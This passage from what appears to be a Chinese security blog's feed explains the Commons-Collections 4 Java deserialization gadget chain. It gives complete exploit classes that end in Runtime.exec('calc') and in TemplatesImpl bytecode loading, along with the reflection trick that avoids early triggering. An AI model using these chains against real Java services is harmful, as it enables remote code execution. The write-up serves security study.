class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">            instantiateTransformer</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    <span class="comment">//  instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">    priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">    priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">    serialize(priorityQueue);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>虽然成功弹出了计算器，但是有报错</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015051.png" alt="image-20250125201408849"></p><p>这是因为执行<code>priorityQueue.add(1)</code>这个语句的时候，它内部会自动进行<code>compare</code>方法的执行，然后调用<code>transform</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015118.png" alt="image-20250125201915181"></p><p>这就意味着，没有开始序列化和反序列化，就可以弹计算器了</p><p>我们可以用<strong>CC6</strong>的方式，给<code>transformingComparator</code>设置成一个无关的对象，<code>add</code>之后再通过反射修改回来</p><p>最终Exp</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4ExpTem</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//    templates.newTransformer();</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//  instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformingField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformingField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformingField.set(transformingComparator, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>动态加载字节码</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4ExpTem</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//    templates.newTransformer();</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//  instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformingField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformingField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformingField.set(transformingComparator, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>Runtime</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4ExpRun</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">//        TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformingField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformingField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformingField.set(transformingComparator, chainedTransformer);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>流程图</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015498.png" alt="image-20250125232845773"></p><p>结合CC1 CC3 CC6</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260015671.png" alt="image-20250126001003128"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a class="link" href="https://gtl-ju.github.io/2023/09/08/CommonCollections4%E4%B8%8ECommonCollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">CommonCollections4与CommonCollections2利用链分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://blog.nbcares.top/archives/CC4">Java_Commons-Collections 4 (CC4)学习过程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/">Java反序列化Commons-Collections篇06-CC4链 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
    <summary type="html">false</summary>
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>flask新回显方式</title>
    <link href="http://example.com/2025/01/24/flask%E6%96%B0%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/"/>
    <id>http://example.com/2025/01/24/flask%E6%96%B0%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/</id>
    <published>2025-01-24T15:19:23.000Z</published>
    <updated>2025-03-07T08:05:17.234Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2348a49b5d6b6f419870f008bb206a0a7683186a832af857feca0b9e6c955961">47e1b38c915f13718bcddaaa4102f6c8b8f9dcd6c604054b366db573c0174bf51bce6e94bbd0b646e9737554a1909c8199e34ad3d83efa6a10868caa28eb900da2628139a1a0afe886c44e20895a155621baefb1000f4344eafae5cedb179f57de02a18e8fe6a581fed497ee6129a2bbd9ee4f78293b938997b61339cbce36ed91cb440dc82e9c7368503f4e96ae813b2a46f1d915c8d4873db2f80040c7c745695237378d6d78450b891bff822050dab961fdd34c19abbb06bc4b4a47832b3acaa2fdb67162ff1114f826735c3c421b4ecd40514b4636165d1d2a0356ff1601eadfae1b94a7a42096d65ac27eec2e071a922dbfe627fd1c35327eb41c1af043fefd882fc6e3f1685a10c8e9564ced1bfe7b8f5983e2a4384cca5f97685830f52569266d4ad226bd167a9a8b566d193f04bf71971f5337e1b51d303b83070741e6c8abb8968a52fc71dc7a5b6c60ce529627b2a3cd20a15b6915d021a61b610268e3fe976c154c6113e9b88aab348fc58910da3bb27657c43fb6643357902adfd0d3bac27ea20f98d1a9e55de58d2110645203899db430b53c85c86e124a46a585dd108cf5f884959b69493c63398646146a3e49f663f64c5a532b7bd3e208c7fb39b5e7ffa69d31268f2942eec4e5c6500adaa926283cc0c854deaeb001b6a3635ce3de4de06b6dd6817307311cfd0b5a652c7971e03d9af0fcd56468d8aaf361ec6c6b3cbdd39641a4c820a3cc6c6099d9ad7b7653cf688f37f0d99b87931fb0d30998ee9e206fdcb2be46b8de7127f0004a6be2281a5314f774349518cf2aa1b99513bb1c77ea85fb9a573b380350c8f32141c72bfb02f879799ead71de77c3efd6dd199541bec